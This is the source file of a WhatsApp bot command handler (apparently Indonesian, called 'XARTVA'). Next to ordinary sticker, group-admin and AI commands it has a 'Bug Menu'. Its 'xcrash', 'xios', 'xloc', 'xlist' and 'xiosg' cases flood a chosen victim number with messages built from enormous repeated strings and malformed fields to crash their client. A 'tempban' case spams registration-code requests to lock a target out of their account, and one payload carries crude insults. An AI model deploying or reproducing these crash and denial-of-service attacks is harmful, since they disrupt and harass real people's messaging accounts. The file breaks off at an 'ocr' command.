require('./config')
const { exec, spawn, execSync } = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { bytesToSize, checkBandwidth, formatSize, getBuffer, isUrl, jsonformat, nganuin, sleep, pickRandom, runtime, shorturl, formatp, color, getGroupAdmins } = require("./lib/myfunc");
const { addExif } = require('./lib/exif')


module.exports = xartva = async (xartva, m, chatUpdate, store) => {
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message?.buttonsResponseMessage?.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'templateButtonReplyMessage' ? m?.message?.templateButtonReplyMessage?.selectedId :
m?.mtype === 'messageContextInfo' ? (
m?.message?.buttonsResponseMessage?.selectedButtonId || 
m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId || 
m?.text
) : ''
) : '';
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await xartva.decodeJid(xartva.user.id);
const isCreator = (m && m?.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
//group
const groupMetadata = m?.isGroup ? await xartva.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;

//================== [ BUGS ] ==================//
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'SELAMAT MALAM'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'SELAMAT PETANG'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'SELAMAT SORE'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'SELAMAT SIANG'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'SELAMAT PAGI'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'SUBUH OYY'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'JAM SEGINI BELUM TIDUR??'
        }

//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
} else global.db.data.users[m?.sender] = {
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!("public" in settings)) settings.public = true
} else global.db.data.settings[botNumber] = {
 autoread: false,
 public: true,
}
} catch (err) {
}

//=================================================//
async function loading() {
  var load = [
    `𝔗𝔲𝔫𝔤𝔤𝔲 𝔰𝔢𝔟𝔢𝔫𝔱𝔞𝔯...`,
    `¹`,
    `²`,
    `³`,
    `*_XARTVA IN HERE_*`
  ]
  var xtr = `*_XARTVA IN HERE_*`
  let { key } = await xartva.sendMessage(m?.chat,{text:xtr})
  for (let i = 0; i < load.length; i++) {
    await xartva.sendMessage(m?.chat, {text:load[i], edit:key})
  }
}
const xbug = {
  key: {
    remoteJid: 'status@broadcast',
    fromMe: false, 
    participants: '0@s.whatsapp.net'
  },
  message: {
    listResponseMessage: {
      title: 'XARTVA'
    }
  }
}

switch(command) {
//=================================================//
case "menu":{
await loading()
const tek = `Halᴏ @${m?.sender.split("@")[0]}, ${ucapanWaktu}\nSelamat datang di bot XARTVA

_*Owner Menu*_
┌ ◦ $
│ ◦ =>
└ ◦ >

_*Sticker Menu*_
┌ ◦ ${prefix}sticker
│ ◦ ${prefix}cls
│ ◦ ${prefix}smeme 
└ ◦ ${prefix}qc

_*Tools Menu*_
┌ ◦ ${prefix}remini
│ ◦ ${prefix}recolor
│ ◦ ${prefix}tts
│ ◦ ${prefix}readvo
│ ◦ ${prefix}tr
│ ◦ ${prefix}jarak
│ ◦ ${prefix}kalkulator
└ ◦ ${prefix}get

_*Tools Menu (XARTVA)*_
┌ ◦ ${prefix}tempban
└ ◦ ${prefix}

_*Ai Menu*_
┌ ◦ ${prefix}ai
│ ◦ ${prefix}bingimg-2d
│ ◦ ${prefix}gemini
└ ◦ ${prefix}gemini-img

_*Bug Menu*_
┌ ◦ ${prefix}xcrash
│ ◦ ${prefix}xreact
│ ◦ ${prefix}xloc
│ ◦ ${prefix}xlist
│ ◦ ${prefix}xiosg
└ ◦ ${prefix}xios

_*Main Menu*_
┌ ◦ ${prefix}disk
└ ◦ ${prefix}ping

_*Voice Menu*_
┌ ◦ ${prefix}bass
│ ◦ ${prefix}blown
│ ◦ ${prefix}deep
│ ◦ ${prefix}earrape
│ ◦ ${prefix}fast
│ ◦ ${prefix}fat
│ ◦ ${prefix}nightcore
│ ◦ ${prefix}reverse
│ ◦ ${prefix}robot
│ ◦ ${prefix}slow
│ ◦ ${prefix}smooth
│ ◦ ${prefix}tupai
└ ◦ ${prefix}smooth

_*Group Menu*_
┌ ◦ ${prefix}add
│ ◦ ${prefix}kick
│ ◦ ${prefix}promote
└ ◦ ${prefix}demote
`
xartva.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: tek,
contextInfo: {
isForwarded: true,
forwardingScore: 9999999,
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true,
title: 'XARTVA - 99999',
body: '99999999',
renderLargerThumbnail: true,
mediaType: 1,
thumbnail: fs.readFileSync('./lib/XARTVA.jpg')
}}}}}}, {})
}
break
//=================================================//
case "disk":{
await loading()
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}
break
//=================================================//
case "tempban":{
if(!text) return m?.reply("Contoh: .tempban 62|857xxxxxxxxx")
await loading()
let num = JSON.parse(fs.readFileSync('./lib/tempban.json'))
let cCode = text.split("|")[0]
let number = text.split("|")[1]
let fullNo = cCode + number
await m?.reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
case "xcrash":{
if (!text) return m?.reply(`${prefix + command} 62857xxxxxxx`)
await loading()
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 25
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    text: "*_Pentrests BUG By OzzyDev X AyipSanzzz_*",
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '12036331944147954@newsletter',
        newsletterName: 'OzzyDev X AyipSanzzz'.repeat(9000),
        serverMessageId: 2
      }
    }
  }, { quoted: xbug })
}
await m?.reply(`*_Send BUG To ${victim} Berhasil🗿_*\n*_Tipe: .xcrash_*`)
}
break
//=================================================//
case "xios":{
if (!text) return m?.reply(`${prefix + command}62857xxxxxxx`)
await loading()
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 30
for (let i = 0; i < amount; i++) {
  await xartva.relayMessage(victim, {
    paymentInviteMessage: {
      serviceType: "FBPAY",
      expiryTimestamp: Date.now() + 189999900000
    }
  }, {})
}
}
break
//=================================================//
case "xreact":{
if (!text) return m?.reply(`${prefix + command} <reply message>`)
await xartva.sendMessage(m?.chat, {
  text: 'Send BUG Successfully',
  contextInfo: {
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '12036331944147954@newsletter',
      newsletterName: 'OzzyDev And AyipSanzzz'.repeat(10000),
      serverMessageId: 2
    }
  }
}, { quoted: xbug })
await xartva.sendMessage(m?.chat, {
  react: {
    text: '😹',
    key: {
      remoteJid: m.chat,
      fromMe: true,
      id: quoted.id
    }
  }
})
}
break
//=================================================//
case "xloc":{
if (!text) return m?.reply(`${prefix + command} 62857xxxxxxx|6`)
await loading()
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = text.split("|")[1]
let XOP = 'OzzyDev X AyipSanzzz'.repeat(0)
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: '?⃢͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨ�⃢⃝⃝⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝XNXX𐏕⃢⃝𐏕⃢⃝⃝⃝𐏕⃢⃝𐏕⃢⃝',
      address: 'NGENTOT ASU CELENG TEMPEK',
      url: `https://${XOP}.com`,
      commet: '𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ࣰࣰࣱࣱࣩ࣯࣯࣯࣯࣯࣯࣮࣮ꪾꪾꪾꪾꪾꪾꪾࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨ࣬࣬͋͋͋͋͌͌ࣼࣼࣷࣷࣷࣷᤨᤨ⃫⃫⃫⃫⃫⃫ࣵࣴࣴࣴࣴ.yapit.⚡⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ࣰࣰࣱࣱࣩ࣯࣯࣯࣯࣯࣯࣮࣮ꪾꪾꪾꪾꪾꪾꪾࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨ࣬࣬͋͋͋͋͌͌ࣼࣼࣷࣷࣷࣷᤨᤨ⃫⃫⃫⃫⃫⃫ࣵࣴࣴࣴࣴ.⚡⚡京⃞ᯱᯱᯱ͋͋͋𐏕⃢⃝京⃝w京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ𐏕⃢⃝京⃝asutem京⃝t⃝𐏕⃢⃝京⃝emerx京⃝𐏕.'.repeat(8000),
      jpegThumbnail: null
    }
  }, { quoted: xbug })
}
m?.reply(`Done`)
}
break
//=================================================//
case "xlist":{
if (!text) return m?.reply(`${prefix + command} 62857xxxxxxx|5`)
await loading()
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = text.split("|")[1]
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    text: ''
  }, { quoted: xbug })
}
m?.reply("Doneeee")
}
break
//=================================================//
case "xiosg":{
if (!text) return m?.reply(`${prefix + command}62857xxxxxxx`)
await loading()
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 35
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    text: 'https://www.google.com',
    contextInfo: {
      externalAdReply: {
        renderLargerThumbnail: true,
        mediaType: 1,
        title: 'AHUDAI GANTENGNYA😹😹',
        body: '𐏕⃢⃝⃝𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝𐏕⃢⃝⃝𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ.⸻⃞亴⃝ꪾꪾ𐏕⃢⃝𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾyapit𐏕⃢⃝⃝𐏕⃢⃝𐏕⃢⃝京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ京⃝𐏕ya京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾ⃝⃝京⃞ᯱᯱᯱ͋͋͋͋ꪾꪾasu⚡京⃞ᯱᯱᯱ⃫⃫⃫⃫⃫ࣩࣩࣩࣩࣩࣩ͋͋͋͋ꪾꪾꪾ࣬࣬࣬࣬ࣨࣧࣧࣧࣧ.⸻⃞亴⃝ꪾꪾ.'.repeat(10000),
        thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
        jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
        previewType: "NONE",
        sourceUrl: link
      }
    }
  })
}
m?.reply("Donnnneeeeee")
}
break
//=================================================//
case "ai":{
if (!text) return m?.reply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
m?.reply(data.result)
}
break
//=================================================//
case "gemini-img":{
if (!quoted) return m?.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m?.reply("hanya support gambar")
let media = await xartva.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
m?.reply(data.text)
}
break
//=================================================//
case "gemini":{
if (!text) return m?.reply("mau nanya apa sama naw")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
m?.reply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
